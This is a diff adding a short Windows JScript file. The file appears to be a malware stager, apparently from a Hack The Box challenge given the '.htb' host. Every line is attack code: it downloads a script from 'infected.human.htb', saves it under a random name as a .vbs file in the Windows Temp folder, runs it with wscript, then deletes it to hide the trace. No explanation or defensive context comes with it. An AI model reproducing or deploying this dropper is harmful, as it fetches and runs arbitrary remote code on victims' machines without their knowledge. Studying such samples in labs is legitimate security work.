@@ -1,0 +1,23 @@
+var HTTPObject = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+var FileSystemObject = new ActiveXObject("Scripting.FileSystemObject");
+var ShellObject = new ActiveXObject("WScript.Shell");
+var TmpPath = 'C:\\Windows\\Temp';
+var Filename = FileSystemObject.GetTempName() + ".vbs"; 
+var FilePath = FileSystemObject.BuildPath(TmpPath, Filename);
+HTTPObject.open("GET", "http://infected.human.htb/d/BKtQR", false);
+HTTPObject.send();
+
+if (HTTPObject.status === 200) {
+    var scriptText = HTTPObject.responseText;
+    var FileHandle = FileSystemObject.CreateTextFile(FilePath, true);
+    FileHandle.write(scriptText);
+    FileHandle.close();
+    var ExecutionHandle = ShellObject.Exec('wscript "' + FilePath + '"');
+    while (ExecutionHandle.Status === 0) {
+        WScript.Sleep(100);
+    }
+    FileSystemObject.DeleteFile(FilePath);
+
+} else {
+    WScript.Echo("Fatal: " + HTTPObject.status);
+}
